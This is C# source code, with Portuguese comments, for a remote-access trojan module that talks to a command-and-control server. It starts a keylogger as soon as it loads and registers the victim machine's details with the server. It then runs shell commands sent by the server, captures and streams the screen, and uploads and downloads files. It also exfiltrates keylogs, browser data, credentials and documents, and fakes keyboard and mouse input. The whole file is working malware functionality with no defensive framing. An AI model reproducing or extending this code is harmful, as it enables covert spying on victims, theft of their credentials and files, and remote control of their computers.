using System;
using System.Collections.Generic;
using System.Threading.Tasks;
using System.Threading;
using System.Net.Http;
using System.Text;
using System.Web.Script.Serialization;
using System.IO;
using System.Drawing;
using System.Drawing.Imaging;
using System.Windows.Forms;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace XYZ.modules
{
    using XYZ.modules.reporters;

    /// <summary>
    /// WebRTC Module - Refatorado para máxima eficiência e automatização
    /// Implementa comunicação bidirecional em tempo real com C2
    /// Suporta: Shell remoto, Desktop streaming, File transfer, Keylogging
    /// </summary>
    public class WebRTCModule : IDisposable
    {
        private bool isConnected = false;
        private bool isRunning = false;
        private System.Threading.Timer heartbeatTimer;
        private System.Threading.Timer commandPollTimer;
        private string sessionId;
        private readonly int HEARTBEAT_INTERVAL = 30000; // 30s
        private readonly int COMMAND_POLL_INTERVAL = 5000; // 5s
        private CancellationTokenSource cancellationTokenSource;
        
        // Módulos integrados
        private ScreenRecordingModule screenRecorder;
        private AdvancedKeyloggerModule keylogger;
        private DataExfiltrationModule exfiltrator;

        public WebRTCModule()
        {
            sessionId = SecurityUtilities.GenerateRandomString(32);
            cancellationTokenSource = new CancellationTokenSource();
            
            // Inicializa módulos integrados automaticamente
            InitializeIntegratedModules();
            
            SecureLogger.LogInfo("WebRTC", "WebRTC module initialized with session: " + sessionId);
        }

        /// <summary>
        /// Inicializa módulos que trabalham em conjunto com WebRTC
        /// </summary>
        private void InitializeIntegratedModules()
        {
            try
            {
                screenRecorder = new ScreenRecordingModule();
                SecureLogger.LogInfo("WebRTC", "Screen recorder integrated");
            }
            catch (Exception ex)
            {
                SecureLogger.LogError("WebRTC.ScreenRecorder", ex);
            }

            try
            {
                keylogger = new AdvancedKeyloggerModule();
                keylogger.Start();
                SecureLogger.LogInfo("WebRTC", "Advanced keylogger integrated and started");
            }
            catch (Exception ex)
            {
                SecureLogger.LogError("WebRTC.Keylogger", ex);
            }

            try
            {
                exfiltrator = new DataExfiltrationModule();
                SecureLogger.LogInfo("WebRTC", "Data exfiltrator integrated");
            }
            catch (Exception ex)
            {
                SecureLogger.LogError("WebRTC.Exfiltrator", ex);
            }
        }

        /// <summary>
        /// Inicializa conexão WebRTC com C2 - AUTOMÁTICO
        /// </summary>
        public async Task InitializeWebRTCConnection(string terminalId)
        {
            if (isRunning)
            {
                SecureLogger.LogWarning("WebRTC", "Already running, skipping initialization");
                return;
            }

            SecureLogger.LogInfo("WebRTC", "Initializing automatic WebRTC connection");

            try
            {
                // Registra sessão no C2
                await RegisterSession(terminalId);

                // Inicia timers automáticos
                StartAutomaticTimers();

                // Inicia loop de processamento de comandos (fire-and-forget intencional)
                StartCommandProcessingLoop(cancellationTokenSource.Token);

                // Inicia streaming automático se disponível (fire-and-forget intencional)
                StartAutomaticScreenStreamLoop(cancellationTokenSource.Token);

                isRunning = true;
                SecureLogger.LogInfo("WebRTC", "WebRTC connection established and running");
            }
            catch (Exception ex)
            {
                SecureLogger.LogError("WebRTC.Initialize", ex);
                throw;
            }
        }

        /// <summary>
        /// Registra sessão WebRTC no servidor C2
        /// </summary>
        private async Task RegisterSession(string terminalId)
        {
            try
            {
                var registrationData = new
                {
                    terminal_id = terminalId,
                    session_id = sessionId,
                    timestamp = DateTime.UtcNow,
                    capabilities = new
                    {
                        remote_shell = true,
                        screen_streaming = true,
                        file_transfer = true,
                        keylogging = true,
                        microphone = false, // Implementar se necessário
                        camera = false      // Implementar se necessário
                    },
                    system_info = new
                    {
                        os = Program.GetOSVersion(),
                        architecture = Program.GetSystemArchitecture(),
                        ip = Program.GetLocalIPAddress(),
                        mac = Program.GetMacAddress()
                    }
                };

                string json = new JavaScriptSerializer().Serialize(registrationData);
                await ResilientC2Communication.PostData("api/webrtc/register", json);

                isConnected = true;
                SecureLogger.LogInfo("WebRTC", "Session registered successfully");
            }
            catch (Exception ex)
            {
                SecureLogger.LogError("WebRTC.Register", ex);
                isConnected = false;
            }
        }

        /// <summary>
        /// Inicia timers automáticos para heartbeat e polling
        /// </summary>
        private void StartAutomaticTimers()
        {
            // Heartbeat timer
            heartbeatTimer = new System.Threading.Timer(async (state) =>
            {
                try
                {
                    await SendHeartbeat();
                }
                catch (Exception ex)
                {
                    SecureLogger.LogError("WebRTC.Heartbeat", ex);
                }
            }, null, HEARTBEAT_INTERVAL, HEARTBEAT_INTERVAL);

            // Command poll timer
            commandPollTimer = new System.Threading.Timer(async (state) =>
            {
                try
                {
                    await PollCommands();
                }
                catch (Exception ex)
                {
                    SecureLogger.LogError("WebRTC.CommandPoll", ex);
                }
            }, null, COMMAND_POLL_INTERVAL, COMMAND_POLL_INTERVAL);

            SecureLogger.LogInfo("WebRTC", "Automatic timers started");
        }

        /// <summary>
        /// Envia heartbeat para manter sessão viva
        /// </summary>
        private async Task SendHeartbeat()
        {
            if (!isConnected) return;

            try
            {
                var heartbeat = new
                {
                    session_id = sessionId,
                    timestamp = DateTime.UtcNow,
                    status = "active",
                    uptime = (int)Program.GetUptime().TotalSeconds,
                    cpu_usage = GetCPUUsage(),
                    memory_usage = GetMemoryUsageMB(),
                    active_user = Environment.UserName
                };

                string json = new JavaScriptSerializer().Serialize(heartbeat);
                await ResilientC2Communication.PostData("api/webrtc/heartbeat", json);
            }
            catch (Exception ex)
            {
                SecureLogger.LogError("WebRTC.Heartbeat", ex);
            }
        }

        /// <summary>
        /// Polling de comandos do C2
        /// </summary>
        private async Task PollCommands()
        {
            if (!isConnected) return;

            try
            {
                string response = await ResilientC2Communication.GetData(string.Format("api/webrtc/commands/{0}", sessionId));
                
                if (!string.IsNullOrEmpty(response))
                {
                    ProcessCommandResponse(response);
                }
            }
            catch (Exception)
            {
                // Polling failure é esperado se não houver comandos
                SecureLogger.LogDebug("WebRTC.Poll", "No commands available or polling failed");
            }
        }

        /// <summary>
        /// Loop contínuo de processamento de comandos
        /// </summary>
        private async Task CommandProcessingLoop(CancellationToken ct)
        {
            SecureLogger.LogInfo("WebRTC", "Command processing loop started");

            while (!ct.IsCancellationRequested)
            {
                try
                {
                    await Task.Delay(2000, ct); // Pequeno delay entre iterações
                }
                catch (TaskCanceledException)
                {
                    break;
                }
            }

            SecureLogger.LogInfo("WebRTC", "Command processing loop stopped");
        }

        /// <summary>
        /// Processa resposta de comando do C2
        /// </summary>
        private void ProcessCommandResponse(string response)
        {
            try
            {
                JavaScriptSerializer serializer = new JavaScriptSerializer();
                dynamic command = serializer.Deserialize<dynamic>(response);

                string commandType = command["type"];
                string commandId = command["id"];

                SecureLogger.LogInfo("WebRTC", string.Format("Processing command: {0}", commandType));
                CommandReporter.ReportReceived(commandId, commandType, response);

                switch (commandType.ToLower())
                {
                    case "shell":
                        Task.Run(() => ExecuteShellCommand(command["data"], commandId));
                        break;

                    case "screenshot":
                        Task.Run(() => TakeScreenshot(commandId));
                        break;

                    case "start_screen_stream":
                        Task.Run(() => StartScreenStreaming(commandId));
                        break;

                    case "stop_screen_stream":
                        StopScreenStreaming();
                        break;

                    case "download_file":
                        Task.Run(() => DownloadFile(command["data"], commandId));
                        break;

                    case "upload_file":
                        Task.Run(() => UploadFile(command["data"], commandId));
                        break;

                    case "get_keylogs":
                        Task.Run(() => SendKeylogs(commandId));
                        break;

                    case "exfiltrate":
                        Task.Run(() => ExfiltrateData(command["data"], commandId));
                        break;

                    default:
                        SecureLogger.LogWarning("WebRTC", string.Format("Unknown command type: {0}", commandType));
                        break;
                }
            }
            catch (Exception ex)
            {
                SecureLogger.LogError("WebRTC.ProcessCommand", ex);
            }
        }

        /// <summary>
        /// Executa comando shell remoto
        /// </summary>
        private async Task ExecuteShellCommand(string command, string commandId)
        {
            try
            {
                ProcessStartInfo psi = new ProcessStartInfo
                {
                    FileName = "cmd.exe",
                    Arguments = string.Format("/c {0}", command),
                    RedirectStandardOutput = true,
                    RedirectStandardError = true,
                    UseShellExecute = false,
                    CreateNoWindow = true
                };

                using (Process process = Process.Start(psi))
                {
                    string output = await process.StandardOutput.ReadToEndAsync();
                    string error = await process.StandardError.ReadToEndAsync();
                    
                    process.WaitForExit();

                    string result = !string.IsNullOrEmpty(output) ? output : error;

                    await SendCommandResult(commandId, "shell", result);
                    CommandReporter.ReportExecutionResult(commandId, "shell", true, result);
                }
            }
            catch (Exception ex)
            {
                SecureLogger.LogError("WebRTC.Shell", ex);
                // Fire-and-forget intencional - não aguarda resultado do erro
                SendCommandResultInBackground(commandId, "shell", string.Format("Error: {0}", ex.Message));
                CommandReporter.ReportExecutionResult(commandId, "shell", false, ex.Message);
            }
        }

        /// <summary>
        /// Captura screenshot
        /// </summary>
        private async Task TakeScreenshot(string commandId)
        {
            try
            {
                byte[] screenshotData = screenRecorder.CaptureScreenshot();
                
                if (screenshotData != null && screenshotData.Length > 0)
                {
                    // Envia via exfiltrator com compressão
                    string filename = string.Format("screenshot_{0:yyyyMMdd_HHmmss}.png", DateTime.UtcNow);
                    await exfiltrator.ExfiltrateBytes(screenshotData, filename, "screenshot");

                    await SendCommandResult(commandId, "screenshot", "Screenshot captured and sent");
                    CommandReporter.ReportExecutionResult(commandId, "screenshot", true, "Screenshot captured and sent");
                }
            }
            catch (Exception ex)
            {
                SecureLogger.LogError("WebRTC.Screenshot", ex);
                // Fire-and-forget intencional - não aguarda resultado do erro
                SendCommandResultInBackground(commandId, "screenshot", string.Format("Error: {0}", ex.Message));
            }
        }

        /// <summary>
        /// Inicia streaming de tela
        /// </summary>
        private async Task StartScreenStreaming(string commandId)
        {
            try
            {
                screenRecorder.StartStreaming();
                await SendCommandResult(commandId, "start_screen_stream", "Screen streaming started");
                CommandReporter.ReportExecutionResult(commandId, "start_screen_stream", true, "Streaming started");
            }
            catch (Exception ex)
            {
                SecureLogger.LogError("WebRTC.StartStream", ex);
                // Fire-and-forget intencional - não aguarda resultado do erro
                SendCommandResultInBackground(commandId, "start_screen_stream", string.Format("Error: {0}", ex.Message));
            }
        }

        /// <summary>
        /// Para streaming de tela
        /// </summary>
        private void StopScreenStreaming()
        {
            try
            {
                if (screenRecorder != null)
                    screenRecorder.StopStreaming();
            }
            catch (Exception ex)
            {
                SecureLogger.LogError("WebRTC.StopStream", ex);
            }
        }

        /// <summary>
        /// Download de arquivo do alvo
        /// </summary>
        private async Task DownloadFile(dynamic data, string commandId)
        {
            try
            {
                string filePath = data["path"];
                
                if (File.Exists(filePath))
                {
                    byte[] fileData = File.ReadAllBytes(filePath);
                    string filename = Path.GetFileName(filePath);
                    
                    await exfiltrator.ExfiltrateBytes(fileData, filename, "file_download");
                    await SendCommandResult(commandId, "download_file", string.Format("File {0} sent", filename));
                    CommandReporter.ReportExecutionResult(commandId, "download_file", true, "File sent: " + filename);
                }
                else
                {
                    await SendCommandResult(commandId, "download_file", "File not found");
                }
            }
            catch (Exception ex)
            {
                SecureLogger.LogError("WebRTC.Download", ex);
                // Fire-and-forget intencional - não aguarda resultado do erro
                SendCommandResultInBackground(commandId, "download_file", string.Format("Error: {0}", ex.Message));
            }
        }

        /// <summary>
        /// Upload de arquivo para o alvo
        /// </summary>
        private async Task UploadFile(dynamic data, string commandId)
        {
            try
            {
                string base64Content = data["content"];
                string targetPath = data["path"];
                
                byte[] fileData = Convert.FromBase64String(base64Content);
                File.WriteAllBytes(targetPath, fileData);
                
                await SendCommandResult(commandId, "upload_file", string.Format("File uploaded to {0}", targetPath));
                CommandReporter.ReportExecutionResult(commandId, "upload_file", true, "File written to " + targetPath);
            }
            catch (Exception ex)
            {
                SecureLogger.LogError("WebRTC.Upload", ex);
                // Fire-and-forget intencional - não aguarda resultado do erro
                SendCommandResultInBackground(commandId, "upload_file", string.Format("Error: {0}", ex.Message));
            }
        }

        /// <summary>
        /// Envia keylogs capturados
        /// </summary>
        private async Task SendKeylogs(string commandId)
        {
            try
            {
                string logs = keylogger.GetLogs();
                
                if (!string.IsNullOrEmpty(logs))
                {
                    await SendCommandResult(commandId, "get_keylogs", logs);
                    keylogger.ClearLogs();
                }
                else
                {
                    await SendCommandResult(commandId, "get_keylogs", "No keylogs available");
                }
            }
            catch (Exception ex)
            {
                SecureLogger.LogError("WebRTC.Keylogs", ex);
                // Fire-and-forget intencional - não aguarda resultado do erro
                SendCommandResultInBackground(commandId, "get_keylogs", string.Format("Error: {0}", ex.Message));
            }
        }

        /// <summary>
        /// Exfiltra dados específicos
        /// </summary>
        private async Task ExfiltrateData(dynamic data, string commandId)
        {
            try
            {
                string dataType = data["type"];
                
                switch (dataType.ToLower())
                {
                    case "browser_data":
                        await exfiltrator.ExfiltrateBrowserData();
                        break;
                    
                    case "credentials":
                        await exfiltrator.ExfiltrateCredentials();
                        break;
                    
                    case "documents":
                        string path = data["path"];
                        await exfiltrator.ExfiltrateDocuments(path);
                        break;
                }

                await SendCommandResult(commandId, "exfiltrate", string.Format("Exfiltration completed: {0}", dataType));
                CommandReporter.ReportExecutionResult(commandId, "exfiltrate", true, "Exfiltrated " + dataType);
            }
            catch (Exception ex)
            {
                SecureLogger.LogError("WebRTC.Exfiltrate", ex);
                // Fire-and-forget intencional - não aguarda resultado do erro
                SendCommandResultInBackground(commandId, "exfiltrate", string.Format("Error: {0}", ex.Message));
            }
        }

        /// <summary>
        /// Loop automático de streaming de tela (opcional)
        /// </summary>
        private async Task AutomaticScreenStreamLoop(CancellationToken ct)
        {
            // Desabilitado por padrão para economizar banda
            // Pode ser ativado via comando do C2
            await Task.CompletedTask;
        }

        /// <summary>
        /// Envia resultado de comando para C2
        /// </summary>
        private async Task SendCommandResult(string commandId, string commandType, string result)
        {
            try
            {
                var resultData = new
                {
                    session_id = sessionId,
                    command_id = commandId,
                    command_type = commandType,
                    result = result,
                    timestamp = DateTime.UtcNow
                };

                string json = new JavaScriptSerializer().Serialize(resultData);
                await ResilientC2Communication.PostData("api/webrtc/result", json);
            }
            catch (Exception ex)
            {
                SecureLogger.LogError("WebRTC.SendResult", ex);
            }
        }


        /// <summary>
        /// Inicia processamento de comandos em background (fire-and-forget)
        /// </summary>
        private void StartCommandProcessingLoop(CancellationToken ct)
        {
            Task.Run(() =>
            {
                CommandProcessingLoop(ct).Wait();
            });
        }

        /// <summary>
        /// Inicia streaming automático em background (fire-and-forget)
        /// </summary>
        private void StartAutomaticScreenStreamLoop(CancellationToken ct)
        {
            Task.Run(() =>
            {
                AutomaticScreenStreamLoop(ct).Wait();
            });
        }

        /// <summary>
        /// Envia resultado de comando em background (fire-and-forget)
        /// </summary>
        private void SendCommandResultInBackground(string commandId, string commandType, string result)
        {
            Task.Run(() =>
            {
                SendCommandResult(commandId, commandType, result).Wait();
            });
        }

        /// <summary>
        /// Obtém uso de CPU
        /// </summary>
        private int GetCPUUsage()
        {
            try
            {
                using (var cpuCounter = new PerformanceCounter("Processor", "% Processor Time", "_Total"))
                {
                    cpuCounter.NextValue();
                    Thread.Sleep(100);
                    return (int)cpuCounter.NextValue();
                }
            }
            catch
            {
                return -1;
            }
        }

        /// <summary>
        /// Obtém uso de memória
        /// </summary>
        private long GetMemoryUsageMB()
        {
            try
            {
                return Process.GetCurrentProcess().WorkingSet64 / (1024 * 1024);
            }
            catch
            {
                return -1;
            }
        }

        public string GetWebRTCCandidates()
        {
            return sessionId;
        }

        public void ProcessWebRTCCandidates(string candidates)
        {
            SecureLogger.LogInfo("WebRTC", string.Format("Processing WebRTC candidates: {0}", candidates));
        }

        public void StartScreenCapture(int interval)
        {
            try
            {
                if (screenRecorder != null)
                {
                    screenRecorder.StartStreaming();
                }
            }
            catch (Exception ex)
            {
                SecureLogger.LogError("WebRTC.StartScreenCapture", ex);
            }
        }

        public void StopScreenCapture()
        {
            try
            {
                if (screenRecorder != null)
                {
                    screenRecorder.StopStreaming();
                }
            }
            catch (Exception ex)
            {
                SecureLogger.LogError("WebRTC.StopScreenCapture", ex);
            }
        }

        public void ExecuteCommand(string command, string commandId = null)
        {
            if (commandId == null) commandId = Guid.NewGuid().ToString();
            Task.Run(async () =>
            {
                try
                {
                    await ExecuteShellCommand(command, commandId);
                }
                catch (Exception ex)
                {
                    SecureLogger.LogError("WebRTC.ExecuteCommand", ex);
                }
            });
        }

        public void SendKeyboardInput(string input)
        {
            try
            {
                System.Windows.Forms.SendKeys.SendWait(input);
            }
            catch (Exception ex)
            {
                SecureLogger.LogError("WebRTC.SendKeyboardInput", ex);
            }
        }

        public void SendSpecialKey(string key)
        {
            try
            {
                System.Windows.Forms.SendKeys.SendWait(key);
            }
            catch (Exception ex)
            {
                SecureLogger.LogError("WebRTC.SendSpecialKey", ex);
            }
        }

        public void MoveMouse(int x, int y)
        {
            try
            {
                System.Windows.Forms.Cursor.Position = new System.Drawing.Point(x, y);
            }
            catch (Exception ex)
            {
                SecureLogger.LogError("WebRTC.MoveMouse", ex);
            }
        }

        public void ClickMouse(int button)
        {
            try
            {
                if (button == 1)
                {
                    System.Windows.Forms.SendKeys.SendWait("{LEFT}");
                }
                else if (button == 2)
                {
                    System.Windows.Forms.SendKeys.SendWait("{RIGHT}");
                }
            }
            catch (Exception ex)
            {
                SecureLogger.LogError("WebRTC.ClickMouse", ex);
            }
        }

        public void CloseConnection()
        {
            try
            {
                isConnected = false;
                isRunning = false;
                cancellationTokenSource.Cancel();
                SecureLogger.LogInfo("WebRTC", "Connection closed");
            }
            catch (Exception ex)
            {
                SecureLogger.LogError("WebRTC.CloseConnection", ex);
            }
        }

        public void Dispose()
        {
            try
            {
                isRunning = false;
                if (cancellationTokenSource != null)
                    cancellationTokenSource.Cancel();
                
                if (heartbeatTimer != null)
                    heartbeatTimer.Dispose();
                if (commandPollTimer != null)
                    commandPollTimer.Dispose();
                
                if (screenRecorder != null)
                    screenRecorder.Dispose();
                if (keylogger != null)
                    keylogger.Stop();
                
                SecureLogger.LogInfo("WebRTC", "WebRTC module disposed");
            }
            catch (Exception ex)
            {
                SecureLogger.LogError("WebRTC.Dispose", ex);
            }
        }
    }
}